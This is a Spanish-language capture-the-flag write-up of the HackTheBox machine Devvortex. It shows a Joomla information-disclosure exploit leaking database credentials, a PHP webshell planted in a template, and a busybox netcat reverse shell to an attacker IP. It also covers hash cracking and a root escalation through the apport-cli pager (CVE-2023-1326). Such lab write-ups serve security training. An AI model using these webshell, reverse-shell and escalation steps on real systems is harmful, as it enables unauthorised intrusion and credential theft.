---
tags:
title: Devvortex - Easy (HTB)
permalink: /Devvortex-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
nmap -sCV -p22,80 10.129.229.146
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-22 16:17 -0500
Nmap scan report for devvortex.htb (10.129.229.146)
Host is up (0.50s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DevVortex
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.40 seconds
```

## Website 

La pagina principal no muestra nada de nada.

![image-center](/assets/images/Pasted image 20251222181733.png)

### Vhost enumeration

Enumerando subdominios, encuentro el siguiente.

```bash
gobuster vhost -u http://devvortex.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 200 --append-domain 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://devvortex.htb
[+] Method:                    GET
[+] Threads:                   200
[+] Wordlist:                  /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:                gobuster/3.8
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
dev.devvortex.htb Status: 200 [Size: 23221]
Progress: 11452 / 100000 (11.45%)^C
```

El cual es otra pagina sin nada de contenido.

![image-center](/assets/images/Pasted image 20251222194513.png)
### Dirsearch 

Asi que use `dirsearch` el cual me encontro los siguientes directorios.

```bash
dirsearch -u http://dev.devvortex.htb/

  _|. _ _  _  _  _ _|_    v0.4.3                                                            
 (_||| _) (/_(_|| (_| )                                                                     
                                                                                            
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 11460

Output File: /home/zs1n/Desktop/htb/dev/reports/http_dev.devvortex.htb/__25-12-22_16-23-05.txt

Target: http://dev.devvortex.htb/

[16:23:05] Starting:                                                                        
[16:23:18] 403 -  564B  - /%2e%2e;/test
[16:23:19] 404 -   16B  - /php                                              
[16:23:59] 404 -   16B  - /adminphp                                         
[16:24:03] 403 -  564B  - /admin/.config                                    
[16:24:30] 301 -  178B  - /administrator  ->  http://dev.devvortex.htb/administrator/
[16:24:31] 200 -   31B  - /administrator/cache/                             
[16:24:31] 403 -  564B  - /administrator/includes/
[16:24:31] 301 -  178B  - /administrator/logs  ->  http://dev.devvortex.htb/administrator/logs/
[16:24:31] 200 -   31B  - /administrator/logs/                              
[16:24:31] 200 -   12KB - /administrator/                                   
[16:24:31] 200 -   12KB - /administrator/index.php
[16:24:38] 403 -  564B  - /admpar/.ftppass                                  
[16:24:38] 403 -  564B  - /admrev/.ftppass
<SNIP>
```

### Administrator login

El directorio `/administrator` me lleva a la siguiente pagina de login, en la cual me doy cuenta que como se puede ver, corre `Joomla CMS`.

![image-center](/assets/images/Pasted image 20251222194612.png)
## Joomla enumeration.

Para enumerar directorios use `droopescan`.

```bash
droopescan scan joomla --url http://dev.devvortex.htb/              
[+] No version found.                                                           

[+] Possible interesting urls found:
    Detailed version information. - http://dev.devvortex.htb/administrator/manifests/files/joomla.xml
    Login page. - http://dev.devvortex.htb/administrator/
    License file. - http://dev.devvortex.htb/LICENSE.txt
    Version attribute contains approx version - http://dev.devvortex.htb/plugins/system/cache/cache.xml

[+] Scan finished (0:00:28.456595 elapsed)
```
### File disclosure

Y en el archivo `http://dev.devvortex.htb/administrator/manifests/files/joomla.xml` veo las siguientes rutas:

![image-center](/assets/images/Pasted image 20251222194845.png)

El archivo `README.txt` veo que muestra la versión con la que corre `joomla`.

![image-center](/assets/images/Pasted image 20251222185243.png)

Por lo que busqué `exploits` asociados a dicha versión.

```bash
searchsploit joomla 4.2
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Joomla JS Jobs plugin 1.4.2 - SQL injection                                                                                                               | php/webapps/52373.txt
Joomla! Component com_civicrm 4.2.2 - Remote Code Injection                                                                                               | php/webapps/24969.txt
Joomla! Component Google Map Landkarten 4.2.3 - SQL Injection                                                                                             | php/webapps/44113.txt
Joomla! Component ionFiles 4.4.2 - File Disclosure                                                                                                        | php/webapps/6809.txt
Joomla! Component jDownloads 1.0 - Arbitrary File Upload                                                                                                  | php/webapps/17303.txt
Joomla! Component MaQma Helpdesk 4.2.7 - 'id' SQL Injection                                                                                               | php/webapps/41399.txt
Joomla! Component mydyngallery 1.4.2 - SQL Injection                                                                                                      | php/webapps/7343.txt
Joomla! com_hdwplayer 4.2 - 'search.php' SQL Injection                                                                                                    | php/webapps/48242.txt
Joomla! v4.2.8 - Unauthenticated information disclosure                                                                                                   | php/webapps/51334.py
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```
### Credentials.

Me quede con el `file disclosure`, lo ejecute y me encontró algunas credenciales y usuarios.

```bash
python2.7 info.py http://dev.devvortex.htb 
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.

[*] Extracting Joomla information from: http://dev.devvortex.htb
()
Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered
()

Site info
Site name: Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: False

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: P4ntherg0t1n5r3c0n##
DB name: joomla
DB prefix: sd4fg_
DB encryption: 0

```
### Auth

Usando las credenciales del usuario `lewis`, pude acceder al panel.

![image-center](/assets/images/Pasted image 20251222185322.png)
## Shell as www-data

Si voy a `system --> Site Templates --> Cassiopeia Details and Files`, veo que puedo editar los archivos que usa este template, por lo que en el archivo `error.php` coloque el siguiente fragmento de codigo `php`.

```php
system($_GET['cmd']);
```
### Webshell

![image-center](/assets/images/Pasted image 20251222185611.png)

Le di a `Save` y desde mi terminal verifique que tenga ejecución de comandos.

```bash
curl -s -X GET 'http://dev.devvortex.htb/templates/cassiopeia/error.php?cmd=id'         
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Por lo que ahora como tengo ejecución, me envié una `Reverse shel`l a mi maquina.

```bash
curl -s -X GET 'http://dev.devvortex.htb/templates/cassiopeia/error.php?cmd=busybox%20nc%2010.10.17.19%204444%20-e%20%2Fbin%2Fbash'
```

```bash
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.229.146] 36238
whoami
www-data
```
## Shell as logan.
### Mysql 

Como vi que las credenciales que me encontró el `exploit` correspondían a la base de datos, me conecte, de todas formas el las mismas credenciales son ubicadas en el archivo `configuration.php`.

```bash
www-data@devvortex:~/dev.devvortex.htb$ cat configuration.php
<?php
<SNIP>
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'lewis';
        public $password = 'P4ntherg0t1n5r3c0n##';
        public $db = 'joomla';
<SNIP>
        public $secret = 'ZI7zLTbaGKliS9gq';
        public $gzip = false;
        public $error_reporting = 'default';
        public $helpurl = 'https://help.joomla.org/proxy?keyref=Help{major}{minor}:{keyref}&lang={langcode}';
        public $offset = 'UTC';
        public $mailonline = true;
        public $mailer = 'mail';
        public $mailfrom = 'lewis@devvortex.htb';
        public $fromname = 'Development';
        public $sendmail = '/usr/sbin/sendmail';
        public $smtpauth = false;
        public $smtpuser = '';
        public $smtppass = '';
        public $smtphost = 'localhost';
<SNIP>
```
### Auth in mysql

Use el siguiente comando para conectarme.

```bash
www-data@devvortex:~/dev.devvortex.htb$ mysql -u lewis -p
Enter password: 
```

Y luego liste todo el contenido que me interesa con estos comandos.

```bash
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql> use joomla
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-------------------------------+
| Tables_in_joomla              |
+-------------------------------+
<SNIP>
| sd4fg_users                   |
<SNIP>
71 rows in set (0.01 sec)

mysql> select * from sd4fg_users;
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2025-12-22 21:54:40 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |
| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
2 rows in set (0.00 sec)
```
### Cracking password

Estos hashes lo metí en un archivo y solo pude romper uno con `john`.

```bash
john hash -w=/usr/share/wordlists/rockyou.txt         
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tequieromucho    (?)     
1g 0:00:01:05 0.17% (ETA: 03:36:17) 0.01524g/s 447.8p/s 469.8c/s 469.8C/s hakimi..MONSTER
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
```
### Auth 

La misma `password` la use para migrar al usuario `logan`.

```bash
www-data@devvortex:~/dev.devvortex.htb$ su logan
Password: 
logan@devvortex:/var/www/dev.devvortex.htb$
```

```bash
logan@devvortex:/var/www/dev.devvortex.htb$ cat /home/logan/user.txt 
ee28b0836ae1dbad1f43b1c764bc666d
```
## Shell as root

Vi que tengo privilegio de ejecutar `apport-cli` como `root`.

```bash
logan@devvortex:/tmp$ sudo -l
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```
### CVE

Para este binario hay un `cve` que se puede ver la información sobre el mismo en este [enlace](https://www.cve.org/CVERecord?id=CVE-2023-1326). El mismo relata que el `less` es configurado como el paginador de la herramienta, permitiendo ejecute el comando `!/bin/bash` y convertir mi shell a una privilegiada.

Para hacer una demostración, use el parámetro `--file-debug`, no importa que opcion coloque despues de ejecutarlo ya que con el mismo entra en modo para debuguear.

```bash
logan@devvortex:/tmp$ sudo /usr/bin/apport-cli --file-bug

*** What kind of problem do you want to report?


Choices:
  1: Display (X.org)
  2: External or internal storage devices (e. g. USB sticks)
  3: Security related problems
  4: Sound/audio related problems
  5: dist-upgrade
  6: installation
  7: installer
  8: release-upgrade
  9: ubuntu-release-upgrader
  10: Other problem
  C: Cancel
Please choose (1/2/3/4/5/6/7/8/9/10/C): 1


*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.

*** What display problem do you observe?


Choices:
  1: I don't know
  2: Freezes or hangs during boot or usage
  3: Crashes or restarts back to login screen
  4: Resolution is incorrect
  5: Shows screen corruption
  6: Performance is worse than expected
  7: Fonts are the wrong size
  8: Other display-related problem
  C: Cancel
Please choose (1/2/3/4/5/6/7/8/C): 2

*** 

To debug X freezes, please see https://wiki.ubuntu.com/X/Troubleshooting/Freeze

Press any key to continue... 

.dpkg-query: no packages found matching xorg
...........
```

Espere unos segundo y luego seleccione la opcion de ver el reporte `(V)`, la cual hace que entre en la interfaz de `less`.

```
*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (1.4 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): V
```
### Shell

En donde en la misma puedo presionar `Ctrl` + `Shift` + `1` seguido de `/bin/bash`.

```bash
Ngid:   0
Pid:    1902
PPid:   1503
TracerPid:      0
Uid:    1000    1000    1000    1000
Gid:    1000    1000    1000    1000
FDSize: 256
Groups: 1000 
!/bin/bash
```

Y me convierto en `root`.

```bash
root@devvortex:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@devvortex:/tmp#
```

```bash
root@devvortex:/tmp# cat /root/root.txt 
e37a57e11eba353879ba2c880487fdaf
```

`~Happy Hacking.`